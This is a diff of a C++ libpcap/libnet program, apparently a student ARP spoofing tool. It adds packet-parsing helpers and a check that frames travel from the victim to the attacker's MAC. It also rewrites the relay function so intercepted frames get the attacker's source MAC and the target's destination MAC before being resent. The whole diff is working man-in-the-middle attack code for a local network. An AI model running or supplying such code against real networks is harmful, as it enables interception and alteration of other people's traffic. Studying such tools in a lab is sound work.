@@ -8,15 +8,19 @@
 #include <cstdio>
 #include <libnet.h>
 #include <netinet/in.h>
-
+#include <vector>
+#include <sstream>
+#include "init.h"
+#include <iomanip>
 #define MAC_SIZE 6
-
 #pragma pack(push, 1)
 struct EthArpPacket final {
     EthHdr eth_;
     ArpHdr arp_;
 };
 #pragma pack(pop)
+
+
 
 
 
@@ -30,6 +34,18 @@ std::string checkSend(const u_char* pac){
     std::string sdr(src_ip);  
 
     return sdr;
+}
+
+std::string checkTarget(const u_char* pac){
+    struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)pac;
+    struct libnet_ipv4_hdr *ip_hdr=(struct libnet_ipv4_hdr*)(pac+sizeof(struct libnet_ethernet_hdr));
+
+    char dst_ip[INET_ADDRSTRLEN];
+    inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip, INET_ADDRSTRLEN);
+    // pac's ipv4_src return in string
+    std::string trg(dst_ip);  
+
+    return trg;
 }
 
 std::string getMyIp(const char* dev) {
@@ -62,7 +78,7 @@ std::string getSenderMac(std::string sdr,const char* dev,std::string mymac) {
     
     char errbuf[PCAP_ERRBUF_SIZE];
     const char* sender = sdr.c_str();
-    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return "error";
@@ -155,7 +171,7 @@ std::string getMyMac(const char* dev) {
 bool sendArpSpoof(std::string sI,std::string tI,const char* dev,std::string sM,std::string mM) {
 
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return false;
@@ -198,96 +214,75 @@ bool isBroadcast(const u_char *packet){
     }
     return true;
 }
-void relay_thread(const u_char* pac,const char* dev,std::string tm) {
-    
+bool isUnicast(const u_char *packet,std::string sender, std::string attackerIp, std::map<std::string,std::string> ip_to_mac){
+    EthArpPacket* pac=(EthArpPacket*)packet;
+
+    printf("pac->eth_.smac_ is %s, ip_to_mac is %s\n\n",std::string(pac->eth_.smac_).c_str(),ip_to_mac[sender].c_str());
+    if(pac->eth_.smac_!=Mac(ip_to_mac[sender])){
+        return false;
+    }
+    if(pac->eth_.dmac_!=Mac(ip_to_mac[attackerIp])){
+        return false;
+    }
+
+    return true;
+}
+std::vector<uint8_t> macAddressStringToBytes(const std::string& mac) {
+    std::vector<uint8_t> bytes;
+    std::stringstream ss(mac);
+    std::string token;
+    while (std::getline(ss, token, ':')) {
+        uint16_t byte;
+        std::stringstream converter(token);
+        converter >> std::hex >> byte;
+        bytes.push_back(static_cast<uint8_t>(byte));
+    }
+
+    return bytes;
+}
+std::string bytesToMacString(const u_char* addr) {
+    std::stringstream ss;
+    for (int i = 0; i < 6; ++i) {
+        ss << std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(addr[i]);
+        if (i != 5) ss << ":";
+    }
+    return ss.str();
+}
+
+std::string checksMac(const u_char* pac){
+    return bytesToMacString(pac + 6);  // Source MAC starts at 6th byte
+}
+
+std::string checkdMac(const u_char* pac){
+    return bytesToMacString(pac);  // Destination MAC starts at 0th byte
+}
+void relayPacket(const u_char* packet, int packetsize, const char* dev, std::string mM, std::string tm) {
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-    if (handle == nullptr) {
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (!handle) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return;
-    }    
-    
-    struct pcap_pkthdr* header;  // header pcap gives us
-
-
-    // loop for packet capturing
-    while (1) {
-        m.lock();
-        printf("realy is on thread\n\n");
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0){ 
-            printf("res error\n");
-            m.unlock();
-            std::this_thread::yield();
-            continue;}
-        if (res == -1 || res == -2){
-            m.unlock();
-            printf("res==-1 or res==-2 continue\n\n");
-            std::this_thread::yield();
-            break;
-        }
-
-        //Ip packet parsing
-        // check Eth_type -> if ipv4 -> relay
-        struct libnet_ethernet_hdr *eth_hdr = (struct libnet_ethernet_hdr *)packet;
-        struct libnet_ipv4_hdr *ip_hdr=(struct libnet_ipv4_hdr*)(packet+sizeof(struct libnet_ethernet_hdr));
-        char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
-        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
-            //printf("293 line continue\n\n");
-            m.unlock();
-            std::this_thread::yield();
-            continue;}
-        inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip, INET_ADDRSTRLEN);
-        inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip, INET_ADDRSTRLEN);
-        if (strcmp(src_ip, sI) != 0 ){
-            //printf("src_ip is : %s, sI is : %s\n\n",src_ip,sI);
-            //printf("dst_ip is : %s, tI is : %s\n\n",dst_ip,tI);
-            //printf("strcmp(src_ip,si)!=0 여기소 continue\n\n");
-            m.unlock();
-            std::this_thread::yield();
-            continue;
-        } 
-
-        //printf("pass!\n");
-        // modify smac to mine (attacker)
-        //printf("pass2!\n");
-        unsigned char *m_mac= getMyMac(dev);
-        if (m_mac == NULL) {
-            fprintf(stderr, "Could not get MAC address.\n");
-            m.unlock();
-            std::this_thread::yield();
-            return;
-        }
-
-        const char* d_mac = ip_to_mac[std::string(tI)].c_str();
-	    std::cout << "d_mac is " << d_mac << std::endl;
-        std::cout << "mac addr is "<< ip_to_mac[std::string(dst_ip)].c_str()<<"\n";
- 
-        uint8_t d_bytes[6];
-        uint8_t s_bytes[6];
-        if (convert_mac(d_mac, d_bytes)) {
-                memcpy(eth_hdr->ether_dhost, d_bytes, 6);
-        } else {
-                printf("Failed to convert MAC addresses.\n");
-        }
-
-        free(m_mac);         
-        //send to target
-        if (header->len > MTU) {
-            printf("jumbo frame\n");
-            m.unlock();
-            std::this_thread::yield();
-            continue;
-        } else if (pcap_sendpacket(handle, packet, header->len) != 0) {
-            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
-            m.unlock();
-            std::this_thread::yield();
-            return;
-        }
-
-        m.unlock();
-        printf("good!\n");
-        std::this_thread::yield();
     }
+
+    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
+
+    // Convert source MAC address string to bytes
+    auto srcMacBytes = macAddressStringToBytes(mM);
+    for (int i = 0; i < ETHER_ADDR_LEN; ++i) {
+        eth_hdr->ether_shost[i] = srcMacBytes[i];
+    }
+
+    // Convert destination MAC address string to bytes
+    auto destMacBytes = macAddressStringToBytes(tm);
+    for (int i = 0; i < ETHER_ADDR_LEN; ++i) {
+        eth_hdr->ether_dhost[i] = destMacBytes[i];
+    }
+
+    printf("packet size is %d!!!!\n\n",packetsize);
+    if (pcap_sendpacket(handle, packet, packetsize ) != 0) {
+        fprintf(stderr, "\nError sending packet: %s\n", pcap_geterr(handle));
+    }
+
+    printf("relay done!!\n\n");
     pcap_close(handle);
-} 
+}
